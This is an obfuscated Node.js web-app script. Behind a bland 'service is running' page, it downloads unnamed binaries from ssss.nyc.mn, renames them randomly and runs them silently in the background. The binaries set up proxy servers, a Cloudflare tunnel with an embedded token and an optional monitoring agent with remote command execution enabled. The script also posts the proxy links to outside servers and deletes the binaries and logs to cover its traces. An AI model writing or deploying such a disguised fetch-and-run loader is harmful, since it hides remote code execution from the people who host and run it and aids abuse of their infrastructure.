'use strict';const _0x43bbfd=_0x5ed8;(function(_0x366c10,_0x3a319d){const _0xbeb901=_0x5ed8,_0x45d593=_0x366c10();while(!![]){try{const _0x139de2=-parseInt(_0xbeb901(0xad))/0x1+-parseInt(_0xbeb901(0x10b))/0x2*(-parseInt(_0xbeb901(0x114))/0x3)+parseInt(_0xbeb901(0xde))/0x4*(parseInt(_0xbeb901(0xa3))/0x5)+-parseInt(_0xbeb901(0x149))/0x6*(-parseInt(_0xbeb901(0x136))/0x7)+-parseInt(_0xbeb901(0xe9))/0x8+-parseInt(_0xbeb901(0xe4))/0x9+parseInt(_0xbeb901(0xeb))/0xa;if(_0x139de2===_0x3a319d)break;else _0x45d593['push'](_0x45d593['shift']());}catch(_0x5e18d9){_0x45d593['push'](_0x45d593['shift']());}}}(_0x29b1,0x3e033));function _0x5ed8(_0xe01f27,_0x4caa93){const _0x29b158=_0x29b1();return _0x5ed8=function(_0x5ed834,_0x22298c){_0x5ed834=_0x5ed834-0x86;let _0x49e19c=_0x29b158[_0x5ed834];return _0x49e19c;},_0x5ed8(_0xe01f27,_0x4caa93);}const express=require('express'),app=express(),axios=require(_0x43bbfd(0x140)),os=require('os'),fs=require('fs'),path=require(_0x43bbfd(0x120)),{promisify}=require('util'),exec=promisify(require(_0x43bbfd(0x13d))[_0x43bbfd(0x9e)]),{execSync}=require(_0x43bbfd(0x13d)),UPLOAD_URL=process[_0x43bbfd(0x14d)][_0x43bbfd(0x117)]||'',PROJECT_URL=process['env'][_0x43bbfd(0xc1)]||'',AUTO_ACCESS=process[_0x43bbfd(0x14d)][_0x43bbfd(0x150)]||![],FILE_PATH=process[_0x43bbfd(0x14d)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x43bbfd(0x14d)][_0x43bbfd(0x132)]||'qianxiuadmin',PORT=process[_0x43bbfd(0x14d)]['SERVER_PORT']||process[_0x43bbfd(0x14d)][_0x43bbfd(0x13b)]||0xbb8,UUID=process[_0x43bbfd(0x14d)][_0x43bbfd(0x124)]||_0x43bbfd(0x131),NEZHA_SERVER=process[_0x43bbfd(0x14d)][_0x43bbfd(0x152)]||'',NEZHA_PORT=process[_0x43bbfd(0x14d)][_0x43bbfd(0xa0)]||'',NEZHA_KEY=process[_0x43bbfd(0x14d)][_0x43bbfd(0x100)]||'',ARGO_DOMAIN=process[_0x43bbfd(0x14d)][_0x43bbfd(0xfd)]||_0x43bbfd(0x90),ARGO_AUTH=process[_0x43bbfd(0x14d)][_0x43bbfd(0x103)]||_0x43bbfd(0xa4),ARGO_PORT=process[_0x43bbfd(0x14d)][_0x43bbfd(0xa9)]||0x1f41,CFIP=process[_0x43bbfd(0x14d)][_0x43bbfd(0x112)]||_0x43bbfd(0xc3),CFPORT=process['env'][_0x43bbfd(0x134)]||0x1bb,NAME=process[_0x43bbfd(0x14d)][_0x43bbfd(0xb2)]||'';!fs[_0x43bbfd(0xce)](FILE_PATH)?(fs[_0x43bbfd(0x148)](FILE_PATH),console[_0x43bbfd(0x111)](FILE_PATH+'\x20is\x20created')):console[_0x43bbfd(0x111)](FILE_PATH+_0x43bbfd(0x123));function generateRandomName(){const _0x52f445=_0x43bbfd,_0x4bbac9='abcdefghijklmnopqrstuvwxyz';let _0x1b3294='';for(let _0x3b7867=0x0;_0x3b7867<0x6;_0x3b7867++){_0x1b3294+=_0x4bbac9[_0x52f445(0xbe)](Math['floor'](Math['random']()*_0x4bbac9['length']));}return _0x1b3294;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x43bbfd(0xdc)](FILE_PATH,npmName),phpPath=path[_0x43bbfd(0xdc)](FILE_PATH,phpName),webPath=path[_0x43bbfd(0xdc)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x43bbfd(0xdc)](FILE_PATH,_0x43bbfd(0x92)),listPath=path['join'](FILE_PATH,_0x43bbfd(0xd7)),bootLogPath=path[_0x43bbfd(0xdc)](FILE_PATH,_0x43bbfd(0xa2)),configPath=path[_0x43bbfd(0xdc)](FILE_PATH,_0x43bbfd(0x9d));function _0x29b1(){const _0x2f3002=['/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','catch','all','false','/sub.txt\x20saved\x20successfully','railway.d.4.8.b.0.d.0.0.1.0.a.2.ip6.arpa','isFile','sub.txt','/tunnel.yml\x20run','none','nohup\x20','filter','aarch64','arm','platform','\x20>/dev/null\x202>&1','443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','config.json','exec','match','NEZHA_PORT','unshift','boot.log','350140PAfeZn','eyJhIjoiOGNhOTliOWUyNjc1YmMxMzRlMGM1YjA4NWQzYTk0MzkiLCJ0IjoiMzdhYTM4MDctMWM1NC00OGZmLTgwYzAtM2NhMjY0YWYzYzZlIiwicyI6IllXWmpZams1WXpVdFpURXdZaTAwWVdRNUxUbGlaamd0TnpnMll6RXlOalV3WkRRMSJ9','2083','set','web\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','ARGO_PORT','createWriteStream','taskkill\x20/f\x20/im\x20','App\x20is\x20running','245642xooaFk','utf-8','error','rm\x20-rf\x20','\x20-c\x20\x22','NAME','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/agent','data','\x20>/dev/null\x202>&1\x20&','\x22\x20>\x20/dev/null\x202>&1','/vless-argo','Empowerment\x20success\x20for\x20','Subscription\x20uploaded\x20successfully','includes','https://amd64.ssss.nyc.mn/web','del\x20/f\x20/q\x20','charAt','www.bing.com:443','NEZHA\x20variable\x20is\x20empty,skip\x20running','PROJECT_URL','https://amd64.ssss.nyc.mn/bot','bk.0407123.xyz','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','freedom','127.0.0.1','vmess','Error\x20downloading\x20files:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x0aclient_secret:\x20','direct','existsSync','xtls-rprx-vision','https://arm64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','status','tunnel.json','list.txt','Download\x20','\x0avless://','from','get','join','?encryption=none&security=tls&sni=','8FGJMRz','https://amd64.ssss.nyc.mn/v1','2087','Skipping\x20adding\x20automatic\x20access\x20task','Content-Type','pop','4400451CdbrZk','unlink','ArgoDomain:','tls','http','3782376kqbntH','forEach','5816190slzoFE','\x20-s\x20','\x20successfully','&fp=firefox&type=ws&host=','statSync','toString','php\x20running\x20error:\x20','8443','\x0a\x20\x20\x20\x20','/config.json\x20>/dev/null\x202>&1\x20&','Empowerment\x20failed\x20for\x20','fileName','Error\x20reading\x20boot.log:','chmod','\x0a\x20\x20tunnel:\x20','.exe\x20>\x20nul\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','split','ARGO_DOMAIN','message','send','NEZHA_KEY','arm64','\x0a\x20\x20credentials-file:\x20','ARGO_AUTH','substring','pipe','vless','response','amd','map','Add\x20automatic\x20access\x20task\x20faild:\x20','9812hsywlF','basename','\x20failed:\x20','length','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','log','CFIP','has','249Cijrsj','readdirSync','post','UPLOAD_URL','Nodes\x20uploaded\x20successfully','win32','unlinkSync','push','?security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','then','finish','path','Unhandled\x20error\x20in\x20startserver:','true','\x20already\x20exists','UUID','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','arch','Error\x20in\x20startserver:','\x20is\x20running','\x0a\x20\x20\x0atrojan://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/api/add-subscriptions','proxy-out','\x20-p\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','quic','dade9724-96d2-461e-9846-61bf68b9d401','SUB_PATH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','CFPORT','&path=%2Ftrojan-argo%3Fed%3D2560#','42siPDAU','base64','listen','tcp','readFileSync','PORT','/vmess-argo?ed=2560','child_process','application/json','clear','axios','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','block','/vmess-argo','firefox','UseIP','\x20>\x20nul\x202>&1','text/plain;\x20charset=utf-8','mkdirSync','332508OTXdhc','--tls','writeFileSync','trim','env','2096','npm\x20running\x20error:\x20','AUTO_ACCESS','/dev/null','NEZHA_SERVER','/api/delete-nodes','Node.js\x20service\x20is\x20running.','\x0a\x20\x20\x0avmess://','stringify','TunnelSecret'];_0x29b1=function(){return _0x2f3002;};return _0x29b1();}function deleteNodes(){const _0x3ba78f=_0x43bbfd;try{if(!UPLOAD_URL)return;if(!fs[_0x3ba78f(0xce)](subPath))return;let _0x42b592;try{_0x42b592=fs[_0x3ba78f(0x13a)](subPath,'utf-8');}catch{return null;}const _0x1258a7=Buffer[_0x3ba78f(0xda)](_0x42b592,_0x3ba78f(0x137))[_0x3ba78f(0xf0)](_0x3ba78f(0xae)),_0x788cb=_0x1258a7[_0x3ba78f(0xfc)]('\x0a')[_0x3ba78f(0x96)](_0x60ac29=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x60ac29));if(_0x788cb[_0x3ba78f(0x10e)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3ba78f(0x86),JSON['stringify']({'nodes':_0x788cb}),{'headers':{'Content-Type':_0x3ba78f(0x13e)}})[_0x3ba78f(0x8c)](_0x119db6=>{return null;}),null;}catch(_0x4af18a){return null;}}function cleanupOldFiles(){const _0x7c63cc=_0x43bbfd;try{const _0x2ab11d=fs[_0x7c63cc(0x115)](FILE_PATH);_0x2ab11d['forEach'](_0x59ba13=>{const _0x276d05=_0x7c63cc,_0x1270e4=path[_0x276d05(0xdc)](FILE_PATH,_0x59ba13);try{const _0xfa4cf7=fs[_0x276d05(0xef)](_0x1270e4);_0xfa4cf7[_0x276d05(0x91)]()&&fs[_0x276d05(0x11a)](_0x1270e4);}catch(_0x1d891c){}});}catch(_0x3da3d1){}}app[_0x43bbfd(0xdb)]('/',function(_0x2918db,_0x2b9eb8){const _0x3d2968=_0x43bbfd;_0x2b9eb8[_0x3d2968(0xff)](_0x3d2968(0x87));});async function generateConfig(){const _0x97347e=_0x43bbfd,_0x3c08d1={'log':{'access':_0x97347e(0x151),'error':'/dev/null','loglevel':_0x97347e(0x94)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x97347e(0xcf)}],'decryption':'none','fallbacks':[{'dest':0x50,'xver':0x1,'path':'','tag':'proxy-out'},{'path':_0x97347e(0xb8),'dest':0xbba},{'path':_0x97347e(0x143),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x97347e(0xc7),'protocol':_0x97347e(0x106),'settings':{'clients':[{'id':UUID}],'decryption':_0x97347e(0x94)},'streamSettings':{'network':_0x97347e(0x139),'security':_0x97347e(0x94)}},{'port':0xbba,'listen':_0x97347e(0xc7),'protocol':_0x97347e(0x106),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x97347e(0x94),'wsSettings':{'path':_0x97347e(0xb8)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x97347e(0xe7),_0x97347e(0x130)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x97347e(0xc7),'protocol':_0x97347e(0xc8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x97347e(0xe8),_0x97347e(0xe7),_0x97347e(0x130)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x97347e(0xc7),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x97347e(0x94),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x97347e(0xe8),_0x97347e(0xe7),_0x97347e(0x130)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x97347e(0xc6),'tag':_0x97347e(0xcd)},{'protocol':'blackhole','tag':_0x97347e(0x142)},{'protocol':_0x97347e(0xc6),'settings':{'domainStrategy':_0x97347e(0x145),'redirect':_0x97347e(0xbf)},'tag':_0x97347e(0x12c)}]};fs[_0x97347e(0x14b)](path[_0x97347e(0xdc)](FILE_PATH,_0x97347e(0x9d)),JSON[_0x97347e(0x89)](_0x3c08d1,null,0x2));}function getSystemArchitecture(){const _0x1e3b0d=_0x43bbfd,_0x376dde=os[_0x1e3b0d(0x126)]();return _0x376dde==='arm'||_0x376dde===_0x1e3b0d(0x101)||_0x376dde===_0x1e3b0d(0x97)?_0x1e3b0d(0x98):_0x1e3b0d(0x108);}function downloadFile(_0x47b42a,_0x251d4a,_0x48187f){const _0x19d0f1=_0x43bbfd,_0xcc79c3=_0x47b42a;!fs[_0x19d0f1(0xce)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4a0070=fs[_0x19d0f1(0xaa)](_0xcc79c3);axios({'method':_0x19d0f1(0xdb),'url':_0x251d4a,'responseType':'stream'})[_0x19d0f1(0x11e)](_0x4c8bc2=>{const _0x339c71=_0x19d0f1;_0x4c8bc2[_0x339c71(0xb5)][_0x339c71(0x105)](_0x4a0070),_0x4a0070['on'](_0x339c71(0x11f),()=>{const _0x202acb=_0x339c71;_0x4a0070['close'](),console[_0x202acb(0x111)](_0x202acb(0xd8)+path['basename'](_0xcc79c3)+_0x202acb(0xed)),_0x48187f(null,_0xcc79c3);}),_0x4a0070['on']('error',_0x3da766=>{const _0xd735e1=_0x339c71;fs[_0xd735e1(0xe5)](_0xcc79c3,()=>{});const _0x12645d='Download\x20'+path[_0xd735e1(0x10c)](_0xcc79c3)+_0xd735e1(0x10d)+_0x3da766['message'];console[_0xd735e1(0xaf)](_0x12645d),_0x48187f(_0x12645d);});})[_0x19d0f1(0x8c)](_0x495751=>{const _0x46ecfd=_0x19d0f1,_0x3edd42=_0x46ecfd(0xd8)+path[_0x46ecfd(0x10c)](_0xcc79c3)+_0x46ecfd(0x10d)+_0x495751[_0x46ecfd(0xfe)];console[_0x46ecfd(0xaf)](_0x3edd42),_0x48187f(_0x3edd42);});}async function downloadFilesAndRun(){const _0x50059b=_0x43bbfd,_0x559f73=getSystemArchitecture(),_0x52bd4b=getFilesForArchitecture(_0x559f73);if(_0x52bd4b[_0x50059b(0x10e)]===0x0){console[_0x50059b(0x111)](_0x50059b(0xfb));return;}const _0x50c9da=_0x52bd4b[_0x50059b(0x109)](_0x45c167=>{return new Promise((_0xa6519,_0x34c605)=>{const _0x5b655f=_0x5ed8;downloadFile(_0x45c167[_0x5b655f(0xf6)],_0x45c167['fileUrl'],(_0x4056ed,_0x57de91)=>{_0x4056ed?_0x34c605(_0x4056ed):_0xa6519(_0x57de91);});});});try{await Promise[_0x50059b(0x8d)](_0x50c9da);}catch(_0x45e79f){console['error'](_0x50059b(0xc9),_0x45e79f);return;}function _0x115ce7(_0x4f5355){const _0x20ae58=_0x50059b,_0x2f2247=0x1fd;_0x4f5355[_0x20ae58(0xea)](_0x5a185a=>{const _0x45306d=_0x20ae58;fs[_0x45306d(0xce)](_0x5a185a)&&fs[_0x45306d(0xf8)](_0x5a185a,_0x2f2247,_0x49b86e=>{const _0x4bfa01=_0x45306d;_0x49b86e?console[_0x4bfa01(0xaf)](_0x4bfa01(0xf5)+_0x5a185a+':\x20'+_0x49b86e):console['log'](_0x4bfa01(0xb9)+_0x5a185a+':\x20'+_0x2f2247['toString'](0x8));});});}const _0x124757=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x115ce7(_0x124757);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x724b5b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x50059b(0xfc)](':')[_0x50059b(0xe3)]():'',_0x414613=new Set(['443',_0x50059b(0xf2),_0x50059b(0x14e),_0x50059b(0xe0),_0x50059b(0xa5),_0x50059b(0xc4)]),_0x18ded8=_0x414613[_0x50059b(0x113)](_0x724b5b)?_0x50059b(0x122):_0x50059b(0x8e),_0x4e5058=_0x50059b(0xcc)+NEZHA_KEY+_0x50059b(0x133)+NEZHA_SERVER+_0x50059b(0x9c)+_0x18ded8+_0x50059b(0x12a)+UUID;fs[_0x50059b(0x14b)](path['join'](FILE_PATH,'config.yaml'),_0x4e5058);const _0x3363ff=_0x50059b(0x95)+phpPath+_0x50059b(0xb1)+FILE_PATH+_0x50059b(0x10f);try{await exec(_0x3363ff),console[_0x50059b(0x111)](phpName+_0x50059b(0x128)),await new Promise(_0x21827c=>setTimeout(_0x21827c,0x3e8));}catch(_0x464706){console['error'](_0x50059b(0xf1)+_0x464706);}}else{let _0xfd8413='';const _0xfb38e3=[_0x50059b(0x9b),_0x50059b(0xf2),_0x50059b(0x14e),_0x50059b(0xe0),_0x50059b(0xa5),_0x50059b(0xc4)];_0xfb38e3[_0x50059b(0xbb)](NEZHA_PORT)&&(_0xfd8413=_0x50059b(0x14a));const _0x445d42=_0x50059b(0x95)+npmPath+_0x50059b(0xec)+NEZHA_SERVER+':'+NEZHA_PORT+_0x50059b(0x12d)+NEZHA_KEY+'\x20'+_0xfd8413+_0x50059b(0xd3);try{await exec(_0x445d42),console[_0x50059b(0x111)](npmName+'\x20is\x20running'),await new Promise(_0x369d4b=>setTimeout(_0x369d4b,0x3e8));}catch(_0x242f3c){console['error'](_0x50059b(0x14f)+_0x242f3c);}}}else console[_0x50059b(0x111)](_0x50059b(0xc0));const _0xa1a98e='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x50059b(0xf4);try{await exec(_0xa1a98e),console['log'](webName+_0x50059b(0x128)),await new Promise(_0x3540ac=>setTimeout(_0x3540ac,0x3e8));}catch(_0x45c13f){console[_0x50059b(0xaf)](_0x50059b(0xa7)+_0x45c13f);}if(fs['existsSync'](botPath)){let _0x329428;if(ARGO_AUTH[_0x50059b(0x9f)](/^[A-Z0-9a-z=]{120,250}$/))_0x329428=_0x50059b(0x12f)+ARGO_AUTH;else ARGO_AUTH[_0x50059b(0x9f)](/TunnelSecret/)?_0x329428=_0x50059b(0xd2)+FILE_PATH+_0x50059b(0x93):_0x329428=_0x50059b(0xca)+FILE_PATH+_0x50059b(0x8b)+ARGO_PORT;try{await exec(_0x50059b(0x95)+botPath+'\x20'+_0x329428+_0x50059b(0xb6)),console['log'](botName+_0x50059b(0x128)),await new Promise(_0x399614=>setTimeout(_0x399614,0x7d0));}catch(_0x281a42){console['error'](_0x50059b(0x110)+_0x281a42);}}await new Promise(_0x4a190e=>setTimeout(_0x4a190e,0x1388));}function getFilesForArchitecture(_0x55d880){const _0x2ebd82=_0x43bbfd;let _0x5e9536;_0x55d880==='arm'?_0x5e9536=[{'fileName':webPath,'fileUrl':_0x2ebd82(0xd1)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5e9536=[{'fileName':webPath,'fileUrl':_0x2ebd82(0xbc)},{'fileName':botPath,'fileUrl':_0x2ebd82(0xc2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3169b7=_0x55d880==='arm'?_0x2ebd82(0xb3):_0x2ebd82(0xb4);_0x5e9536[_0x2ebd82(0xa1)]({'fileName':npmPath,'fileUrl':_0x3169b7});}else{const _0x1b2dea=_0x55d880===_0x2ebd82(0x98)?_0x2ebd82(0xd0):_0x2ebd82(0xdf);_0x5e9536[_0x2ebd82(0xa1)]({'fileName':phpPath,'fileUrl':_0x1b2dea});}}return _0x5e9536;}function argoType(){const _0x4bc255=_0x43bbfd;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4bc255(0xbb)](_0x4bc255(0x8a))){fs[_0x4bc255(0x14b)](path[_0x4bc255(0xdc)](FILE_PATH,_0x4bc255(0xd6)),ARGO_AUTH);const _0x315199=_0x4bc255(0xf9)+ARGO_AUTH[_0x4bc255(0xfc)]('\x22')[0xb]+_0x4bc255(0x102)+path[_0x4bc255(0xdc)](FILE_PATH,_0x4bc255(0xd6))+_0x4bc255(0x11d)+ARGO_DOMAIN+_0x4bc255(0x141)+ARGO_PORT+_0x4bc255(0xc5);fs['writeFileSync'](path[_0x4bc255(0xdc)](FILE_PATH,'tunnel.yml'),_0x315199);}else console['log'](_0x4bc255(0x12e));}argoType();async function extractDomains(){const _0x474c88=_0x43bbfd;let _0x5b247a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5b247a=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x5b247a),await _0x297d04(_0x5b247a);else try{const _0x4cac39=fs[_0x474c88(0x13a)](path[_0x474c88(0xdc)](FILE_PATH,_0x474c88(0xa2)),_0x474c88(0xae)),_0x5c348c=_0x4cac39[_0x474c88(0xfc)]('\x0a'),_0x36794d=[];_0x5c348c['forEach'](_0x5349a0=>{const _0x2d3595=_0x474c88,_0x579570=_0x5349a0[_0x2d3595(0x9f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x579570){const _0x123bca=_0x579570[0x1];_0x36794d[_0x2d3595(0x11b)](_0x123bca);}});if(_0x36794d[_0x474c88(0x10e)]>0x0)_0x5b247a=_0x36794d[0x0],console[_0x474c88(0x111)](_0x474c88(0xe6),_0x5b247a),await _0x297d04(_0x5b247a);else{console[_0x474c88(0x111)](_0x474c88(0x125)),fs[_0x474c88(0x11a)](path['join'](FILE_PATH,_0x474c88(0xa2)));async function _0x439628(){const _0x4c1d81=_0x474c88;try{process['platform']===_0x4c1d81(0x119)?await exec(_0x4c1d81(0xab)+botName+_0x4c1d81(0xfa)):await exec('pkill\x20-f\x20\x22['+botName[_0x4c1d81(0xbe)](0x0)+']'+botName[_0x4c1d81(0x104)](0x1)+_0x4c1d81(0xb7));}catch(_0x28913c){}}_0x439628(),await new Promise(_0x40b096=>setTimeout(_0x40b096,0xbb8));const _0x12b769=_0x474c88(0xca)+FILE_PATH+_0x474c88(0x8b)+ARGO_PORT;try{await exec(_0x474c88(0x95)+botPath+'\x20'+_0x12b769+_0x474c88(0xb6)),console['log'](botName+_0x474c88(0x128)),await new Promise(_0x1be2ef=>setTimeout(_0x1be2ef,0xbb8)),await extractDomains();}catch(_0x3e8eac){console[_0x474c88(0xaf)]('Error\x20executing\x20command:\x20'+_0x3e8eac);}}}catch(_0x1a4fd7){console['error'](_0x474c88(0xf7),_0x1a4fd7);}async function _0x297d04(_0x47e087){const _0x4b16e2=_0x474c88,_0x80936d=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x4b16e2(0xae)}),_0x1111c1=_0x80936d[_0x4b16e2(0x14c)](),_0x49a27e=NAME?NAME+'-'+_0x1111c1:_0x1111c1;return new Promise(_0x302cd1=>{setTimeout(()=>{const _0x5220d2=_0x5ed8,_0x38f8c9={'v':'2','ps':''+_0x49a27e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5220d2(0x94),'host':_0x47e087,'path':_0x5220d2(0x13c),'tls':'tls','sni':_0x47e087,'alpn':'','fp':_0x5220d2(0x144)},_0x3a4c12=_0x5220d2(0xd9)+UUID+'@'+CFIP+':'+CFPORT+_0x5220d2(0xdd)+_0x47e087+_0x5220d2(0xee)+_0x47e087+_0x5220d2(0xcb)+_0x49a27e+_0x5220d2(0x88)+Buffer['from'](JSON[_0x5220d2(0x89)](_0x38f8c9))[_0x5220d2(0xf0)]('base64')+_0x5220d2(0x129)+UUID+'@'+CFIP+':'+CFPORT+_0x5220d2(0x11c)+_0x47e087+_0x5220d2(0xee)+_0x47e087+_0x5220d2(0x135)+_0x49a27e+_0x5220d2(0xf3);console['log'](Buffer['from'](_0x3a4c12)[_0x5220d2(0xf0)](_0x5220d2(0x137))),fs[_0x5220d2(0x14b)](subPath,Buffer[_0x5220d2(0xda)](_0x3a4c12)[_0x5220d2(0xf0)](_0x5220d2(0x137))),console['log'](FILE_PATH+_0x5220d2(0x8f)),uploadNodes(),app[_0x5220d2(0xdb)]('/'+SUB_PATH,(_0x24a298,_0x36a992)=>{const _0xdbe126=_0x5220d2,_0x408861=Buffer[_0xdbe126(0xda)](_0x3a4c12)['toString']('base64');_0x36a992[_0xdbe126(0xa6)](_0xdbe126(0xe2),_0xdbe126(0x147)),_0x36a992[_0xdbe126(0xff)](_0x408861);}),_0x302cd1(_0x3a4c12);},0x7d0);});}}async function uploadNodes(){const _0x19f9d7=_0x43bbfd;if(UPLOAD_URL&&PROJECT_URL){const _0x4ef675=PROJECT_URL+'/'+SUB_PATH,_0x390799={'subscription':[_0x4ef675]};try{const _0x5aaf39=await axios[_0x19f9d7(0x116)](UPLOAD_URL+_0x19f9d7(0x12b),_0x390799,{'headers':{'Content-Type':_0x19f9d7(0x13e)}});return _0x5aaf39&&_0x5aaf39[_0x19f9d7(0xd5)]===0xc8?(console['log'](_0x19f9d7(0xba)),_0x5aaf39):null;}catch(_0x5ad2eb){if(_0x5ad2eb[_0x19f9d7(0x107)]){if(_0x5ad2eb[_0x19f9d7(0x107)][_0x19f9d7(0xd5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x43b4ac=fs['readFileSync'](listPath,'utf-8'),_0x5810ff=_0x43b4ac[_0x19f9d7(0xfc)]('\x0a')[_0x19f9d7(0x96)](_0x5995e1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5995e1));if(_0x5810ff['length']===0x0)return;const _0x3c833d=JSON[_0x19f9d7(0x89)]({'nodes':_0x5810ff});try{const _0x135b1d=await axios[_0x19f9d7(0x116)](UPLOAD_URL+'/api/add-nodes',_0x3c833d,{'headers':{'Content-Type':_0x19f9d7(0x13e)}});return _0x135b1d&&_0x135b1d[_0x19f9d7(0xd5)]===0xc8?(console[_0x19f9d7(0x111)](_0x19f9d7(0x118)),_0x135b1d):null;}catch(_0x11d7b2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x7053f1=_0x5ed8,_0x494de6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x494de6[_0x7053f1(0x11b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x494de6[_0x7053f1(0x11b)](phpPath);process[_0x7053f1(0x99)]===_0x7053f1(0x119)?exec(_0x7053f1(0xbd)+_0x494de6['join']('\x20')+_0x7053f1(0x146),_0x31f9ad=>{const _0x53a582=_0x7053f1;console[_0x53a582(0x13f)](),console[_0x53a582(0x111)](_0x53a582(0xac)),console[_0x53a582(0x111)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x7053f1(0xb0)+_0x494de6[_0x7053f1(0xdc)]('\x20')+_0x7053f1(0x9a),_0x1071cb=>{const _0x266827=_0x7053f1;console[_0x266827(0x13f)](),console['log']('App\x20is\x20running'),console[_0x266827(0x111)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xff2c59=_0x43bbfd;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0xff2c59(0xe1));return;}try{const _0x43c781=await axios[_0xff2c59(0x116)](_0xff2c59(0xd4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xff2c59(0x13e)}});return console[_0xff2c59(0x111)](_0xff2c59(0xa8)),_0x43c781;}catch(_0x37786c){return console[_0xff2c59(0xaf)](_0xff2c59(0x10a)+_0x37786c[_0xff2c59(0xfe)]),null;}}async function startserver(){const _0x4b1499=_0x43bbfd;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x28b0c8){console[_0x4b1499(0xaf)](_0x4b1499(0x127),_0x28b0c8);}}startserver()[_0x43bbfd(0x8c)](_0x5dd4c8=>{const _0x18b958=_0x43bbfd;console['error'](_0x18b958(0x121),_0x5dd4c8);}),app[_0x43bbfd(0x138)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
